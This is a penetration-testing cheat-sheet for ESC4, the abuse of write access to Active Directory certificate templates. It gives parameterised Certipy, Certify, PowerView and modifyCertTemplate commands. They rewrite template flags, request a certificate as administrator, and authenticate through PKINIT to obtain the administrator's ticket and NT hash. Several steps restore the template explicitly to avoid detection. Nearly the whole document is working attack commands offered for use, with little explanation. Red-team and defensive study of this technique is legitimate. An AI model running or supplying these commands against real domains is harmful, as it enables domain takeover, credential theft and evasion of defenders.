---
technique: ESC4 - Certificate Template ACL Abuse
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc4 certificate-services pkinit
---

# ESC4 - Certificate Template ACL Abuse

ESC4 abuses write permissions over certificate templates to make them vulnerable, request a certificate, then optionally restore the template.

## Reference

### Template hijacking walkthrough

#certipy #template-write

Walkthrough text for ESC4: rewrite a vulnerable template, request a cert as administrator, then PKINIT auth. Prints the steps as reference notes; not meant to be executed as-is.

```sh title:"Reference walkthrough for ESC4 template hijacking"
cat << EOF
Exploiting ESC4 involves an attacker with write permissions on a template first modifying it to a vulnerable configuration (e.g., to resemble an ESC1 scenario), then requesting a certificate using this maliciously altered template, and finally, potentially reverting the changes to cover their tracks. Assume the attacker is attacker@corp.local and has obtained write permissions on the "$template_name" template.
Step 1: Modify the template to a vulnerable state. Certipy's template command with the -write-default-configuration option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state.
certipy template \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -template '$template_name' \
    -write-default-configuration && certipy req \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -target '$target_ca' \
    -ca '$ca_name' -template '$template_name' \
    -upn 'administrator@$domain' -sid '$admin_sid'
Step 2: Request a certificate using the modified template.
certipy req \
    -u '$user@$domain' -p '$pass' \
    -dc-ip '$rhost_ip' -target '$target_ca' \
    -ca '$ca_name' -template '$template_name' \
    -upn 'administrator@$domain' -sid '$admin_sid'
Step 3: Authenticate using the obtained certificate.
certipy auth -pfx 'administrator.pfx' -dc-ip '$rhost_ip'
EOF
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
var target_ca
var ca_name
var admin_sid
-->

## Windows

### ESC4: Step 1: enable enrollee-supplied SAN (PowerView)

#powershell #powerview #template-write

Enable the enrollee-supplied SAN flag on the template via PowerView.

```powershell title:"ESC4: XOR mspki-enrollment-flag to enable enrollee-supplied SAN"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-enrollment-flag'=2} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 2: clear RA signature requirement (PowerView)

#powershell #powerview #template-write

Clear the RA signature requirement on the template so no enrollment agent approval is needed.

```powershell title:"ESC4: set mspki-ra-signature to 0"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -Set @{'mspki-ra-signature'=0} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 3: enable subject name flag (PowerView)

#powershell #powerview #template-write

Enable the certificate name flag that allows the requester to supply an arbitrary subject name.

```powershell title:"ESC4: XOR mspki-certificate-name-flag to allow arbitrary subject"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 4: request cert with admin SAN (Certify)

#powershell #certify #san

Request a cert with administrator in the SAN against the now-vulnerable template.

```powershell title:"ESC4: request cert with administrator SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"administrator"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### Certify: enumerate template ACEs (ESC4)

#powershell #certify #enum

Enumerate certificate templates to find sensitive ACEs that allow template modification.

```powershell title:"ESC4: enumerate templates for sensitive ACEs with Certify"
.\Certify.exe find
```
<!-- cheat
import domain_ip
import users
-->

### PowerView: Step 4: set client auth application policy (ESC4)

#powershell #powerview #template-write

Set the application policy on the template to Client Authentication so the cert can be used for PKINIT.

```powershell title:"ESC4: set mspki-certificate-application-policy to Client Auth OID"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

## Linux

### ESC4: Step 1: save old template config (certipy)

#certipy #template-write

Save the original template configuration before making changes.

```sh title:"ESC4: save original template config"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -save-old
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### ESC4: Step 2: request cert with admin UPN (certipy)

#certipy #template-write #san

Request a cert with the admin UPN against the now-vulnerable template config.

```sh title:"ESC4: request cert with admin UPN against modified template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC4: Step 3: restore original template config (certipy)

#certipy #template-write

Restore the original template configuration to avoid detection.

```sh title:"ESC4: restore original template config from saved JSON"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -configuration $template_name.json
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### certipy: Step 1: save old template config then write vulnerable config (ESC4)

#certipy #template-write

Save old template config and push default vulnerable configuration to enable enrollee-supplied SAN and disable approval.

```sh title:"ESC4: save old config and write default vulnerable configuration"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -write-default-configuration
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### certipy: Step 3: restore original template config (ESC4)

#certipy #template-write

Restore the original template configuration from the saved JSON backup.

```sh title:"ESC4: restore original template config from saved JSON"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -write-configuration $template_name.json -no-save
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### certipy: Step 4: PKINIT as administrator (ESC4)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC4: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### modifyCertTemplate: Step 1: set enrollment flag (ESC4)

#python #modify-cert-template #template-write

Set mspki-enrollment-flag to enable enrollee-supplied SAN via modifyCertTemplate.

```sh title:"ESC4: set mspki-enrollment-flag via modifyCertTemplate"
modifyCertTemplate.py -template $template_name -value 2 -property mspki-enrollment-flag "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 2: clear RA signature requirement (ESC4)

#python #modify-cert-template #template-write

Clear the RA signature requirement on the template.

```sh title:"ESC4: set mspki-ra-signature to 0 via modifyCertTemplate"
modifyCertTemplate.py -template $template_name -value 0 -property mspki-ra-signature "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 3: add enrollee-supplies-subject flag (ESC4)

#python #modify-cert-template #template-write

Add the enrollee_supplies_subject flag to msPKI-Certificate-Name-Flag.

```sh title:"ESC4: add enrollee_supplies_subject to msPKI-Certificate-Name-Flag"
modifyCertTemplate.py -template $template_name -add enrollee_supplies_subject -property "msPKI-Certificate-Name-Flag" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 4: set client auth EKU (ESC4)

#python #modify-cert-template #template-write

Set the pKIExtendedKeyUsage to Client Authentication and PKINIT EKU OIDs.

```sh title:"ESC4: set pKIExtendedKeyUsage to client auth OIDs"
modifyCertTemplate.py -template $template_name -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property "pKIExtendedKeyUsage" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->
